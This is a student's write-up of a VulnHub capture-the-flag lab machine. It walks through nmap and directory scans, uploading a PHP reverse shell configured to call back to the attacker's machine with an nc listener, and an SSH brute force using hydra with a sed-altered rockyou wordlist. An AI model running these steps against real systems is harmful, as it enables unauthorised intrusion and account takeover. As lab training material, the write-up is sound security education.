 Report Labs / Flavio POGGIOLI

## Table of contents

  - [Report Labs / Flavio POGGIOLI](#report-labs--flavio-poggioli)
  - [Table of contents](#table-of-contents)

## VM n°546

Targets : Reconnaissance, brute force, exploit, web, privilege escalation

### 1. Find IP address of the machine

```bash
$ sudo netdiscover -r 10.0.2.0/24
```
![picture 1](../images/ad7f8acf0ce7fab98ee21d1d6eed7be60aa2a356a3600f68404373a548c0602f.png)  

### 2. List all open ports

We need to determine the open ports and the services running on them using nmap with some options (uniquly ports and secondly enabling default scripts, identifying service versions, and disregarding ping host discovery.).

```bash
$ sudo nmap -p- 10.0.2.9
$ sudo nmap -sC -sV -Pn 10.0.2.9
```  
![picture 2](../images/541a238f4209f27f8c725c5a7fb111de46e584ed35d03e2ed91cc907d3ae509c.png)  

![picture 3](../images/3b973d0b72edd980b20f600b241a8ad3c5507d3b8a50479943f3626629e6a117.png)  


Now we can see that theses ports are open (all TCP) :
- port 22 —  OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
- port 80 - Apache httpd 2.4.18 ((Ubuntu))
- port 110 - Dovecot pop3d
- port 143 - Dovecot imapd

### 3. Find vulnerabilities

#### 3.1. Port 80 - HTTP

We can see that the web server is running on port 80, so we can try to find something on it with dirb.

```bash
$ dirb http://10.0.2.9
```

![picture 4](../images/26667cd50694326a941d37d7c7717a757a83a73b651afd87073576e68a2f2420.png)  

Nothing intresting here, so we can try to find something else with Dirsearch.

```bash
$ sudo apt install dirsearch
$ sudo dirsearch -u http://10.0.2.9 -U
```
`-U` is for using the UPPER case letters in wordlist. (hint in the vulnhub description)

![picture 0](../images/a0b2bae8a8fa21ed7f4fb9ae40c7d5b1ac3529efc7a8bb7fe762abad2f7d81d5.png)  

We can find ROBOTS.txt, so we can try to access it.

In the page we can see 2 things at the top and at the bottom of the page :

![picture 1](../images/7e89c2c2e8ab0d6251c25553feddd29aa1a4d948c25aefae7e6ad19a3e6be7b6.png)  


![picture 2](../images/e40a489de70dc0f6dcb9bdb21c7aa7982939feefb4e70ef58799c3966716dc17.png)  


We can try to access the page upload.php, but there is nothing in here...

The other string is more interesting, we don't have any access to this directory, maybe scan it with a tool like dirb or dirsearch.

![picture 3](../images/18e888b33f8ce694f5892fd8c3d1ea4b5c43df42257f3a6d9fcf337191e41928.png)  


With dirssearch we can find a new upload directory with one page to upload php files and another to upload html files.

![picture 4](../images/d5b84c75bbe00cfa1b963758323181a9e3fa5aec58c29b7129f5db2788bb5cac.png)  


![picture 5](../images/f60e59a12ab4e71aea2353d49caf922ecb35d2ac085bd299ca8f701535963cff.png)  


We can try to upload a file to get a reverse shell like the Lab4.
Just insure that the IP address and the port are correct in the port (the kali machine and a random port 8080 for me)
With this script
[Github source of php reverse shell script](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

![picture 6](../images/b1a61e9c4f44bd437aff5cfeb10831b9523f70c7a3242e76f7540b531831d695.png)  


```php
set_time_limit (0);
$VERSION = "1.0";
$ip = 'kali-ip';  // CHANGE THIS
$port = 8080;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

We can listen with `nc -v -n -l -p 8080`

We need to access to this url to activate the reverse shell : `http://10.0.2.9/igmseklhgmrjmtherij2145236/upload/php-reverse-shell.php3`

![picture 7](../images/9eecf5b87975b9ad72fe3066c8e409eabd6624f8d2f5072202298faf1242901c.png)  

With that, we can access to a reverse shell with the user www-data.

Now, we can try to find a way to escalate privileges.
There is a hint in the www-data home directory, so we can try to find something in it.

![picture 8](../images/c3f9a2c451e1d3dac7a4c619a7fb28f6d445b5fc24f5255e75fa82cf89477a15.png)  


The hint mentions rockyou.txt and sed which is used for searching, replacing, and inserting/deleting text in a .txt document.

We can search other hints in other users in the system.

2 users are in the system : `anna` & `thomas`.

![picture 9](../images/71769649d93e524ff7a7ba2a23c4a74ebc584829accd4075af38d4905248d218.png)  

anna's directory is not accessible, but we can access to thomas's directory.
nothing in there, just one file interesting, `.todo`

![picture 10](../images/80d20d2e02a65eb6a3f54ccb32480177979c7d8c32d8ca4bb341029b47cb3a78.png)  

In todo file, we can see that thomas has to take a exclamation point to his passwords.

So maybe we can try to add a exclamation point to the password of thomas with sed and exploit it with hydra and rockyou.txt.

```bash
$ cat rockyou.txt | sed 's/$/!/g' > wordlist
```
Now, the new wordlist can be used with Hydra.

```bash
$ hydra -l thomas -P wordlist ssh://10.0.2.9 -t 4
```
-l for login, -p for password list and -t for the tasks in parallel